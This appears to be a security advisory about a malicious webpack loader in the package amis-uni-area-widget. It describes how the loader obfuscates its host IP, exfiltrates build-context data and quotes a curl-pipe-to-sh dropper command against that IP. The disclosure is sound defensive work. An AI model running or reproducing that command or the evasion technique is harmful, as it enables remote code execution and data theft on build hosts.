summary: amis-uni-area-widget ships webpack loader that fetches and executes remote shell payload from hardcoded IP
details: dist/bsrc-loader.js is a webpack loader invoked by dist/renderer.umd.js. When a downstream consumer bundles the widget, the loader assembles the destination host 49.232.169.67 from an octet array (['49','232','169','67'].join('.')) to evade string matching, base64url-encodes build-context data (cwd, resource path, webpack rootContext/context, PID, and an internal SSRF probe body against bsrc-ssrf.n.baidu-int.com) and sends it as query parameters to http://49.232.169.67:80/bsrc-r269. On Linux it then spawns /bin/sh with a detached command that pipes `curl -fsSL http://49.232.169.67:80/slt` (with a wget fallback) into sh and sleeps 9 days, executing attacker-controlled shell content on the build host. The fetch is unpinned, unverified, over plain HTTP to a bare IP, and the destination host is obfuscated — the shape is a build-time dropper plus host/build-context exfiltration, not a legitimate build helper.

cwes.description: The product contains code that appears to be malicious in nature.
